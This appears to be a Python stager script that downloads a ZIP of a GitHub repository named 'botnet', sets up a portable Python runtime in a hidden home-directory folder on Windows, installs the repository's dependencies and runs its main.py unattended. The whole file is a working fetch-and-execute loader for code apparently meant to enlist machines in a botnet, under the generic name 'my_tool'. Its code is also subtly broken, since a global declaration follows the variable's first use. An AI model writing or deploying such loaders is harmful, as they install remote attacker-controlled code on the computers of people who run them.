import platform
import shutil
import subprocess
import sys
import urllib.request
import zipfile
from pathlib import Path

working_dir = Path.home() / ".my_tool_data"
runtime_dir = working_dir / "python_runtime"
portable_python = runtime_dir / "python.exe"

github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 
winpython_zip_url = "https://github.com/winpython/winpython/releases/download/17.2.20251222post1/WinPython64-3.14.2.0dot_post1.zip"

def main():
    python_cmd = get_python_command()
    script_path = download_zip()
    
    if script_path and python_cmd: 
        install_packages(python_cmd, script_path.parent)
        run_main_script(script_path, python_cmd)
    else:
        print("Could not initialize environment or download script.")


def get_python_command():
    current_os = platform.system()
    if current_os == "Windows":
        if not portable_python.exists():
            setup_win_portable_python()
        return portable_python
    else:
        system_python = shutil.which("python3") or shutil.which("python")
        return Path(system_python) if system_python else None


def setup_win_portable_python():
    print(f"Windows detected. Preparing portable runtime in {working_dir}...")
    runtime_dir.mkdir(parents=True, exist_ok=True)
    zip_path = working_dir / "python_runtime.zip"
    
    try:
        print("Downloading WinPython...")
        urllib.request.urlretrieve(winpython_zip_url, str(zip_path))
        
        print("Extracting...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(runtime_dir)
        
        if not portable_python.exists():
            for subpath in runtime_dir.rglob("python.exe"):
                global portable_python
                portable_python = subpath
                break
        
        zip_path.unlink()
        print(f"Portable Python ready at: {portable_python}")
    except Exception as e:
        print(f"Failed to set up Windows portable Python: {e}")
        sys.exit(1)


def download_zip():
    working_dir.mkdir(parents=True, exist_ok=True)
    zip_filepath = working_dir / "repo_download.zip"

    print(f"Downloading ZIP from {github_zip_url}...")
    try:
        urllib.request.urlretrieve(github_zip_url, str(zip_filepath))
        
        print("Extracting ZIP...")
        with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
            zip_ref.extractall(working_dir)
            
        extracted_folders = [
            d for d in working_dir.iterdir() 
            if d.is_dir() and d.name != "python_runtime"
        ]
        
        if not extracted_folders:
            raise FileNotFoundError("No repo folders found inside the zip file")
            
        repo_root = extracted_folders[0]
        script_path = repo_root / "main.py"
        zip_filepath.unlink()
        return script_path
    
    except Exception as e:
        print(f"Error during download or extraction: {e}")
        return None


def install_packages(python_exe: Path, repo_root: Path):
    if not python_exe.exists():
        print(f"Interpreter not found at: {python_exe}")

    if not repo_root.exists():
        print(f"Repository doesn't exist at: {repo_root}")

    pyproject_file = repo_root / "pyproject.toml"
    if pyproject_file.exists():
        try:
            subprocess.run(
                [str(python_exe), "-m", "pip", "install", "."], 
                cwd=str(repo_root), 
                check=True
            )
            print("Dependencies installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install dependencies: {e}")


def run_main_script(script_path: Path, python_exe: Path):
    if not python_exe.exists():
        print(f"Interpreter not found at: {python_exe}")
        return
    
    if not script_path.exists():
        print(f"Script not found at: {script_path}")
        return
    
    print(f"Executing {script_path} using {python_exe}...")
    try:
        subprocess.run(
            [str(python_exe), str(script_path)], 
            cwd=str(script_path.parent), 
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"External script failed with exit code {e.returncode}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()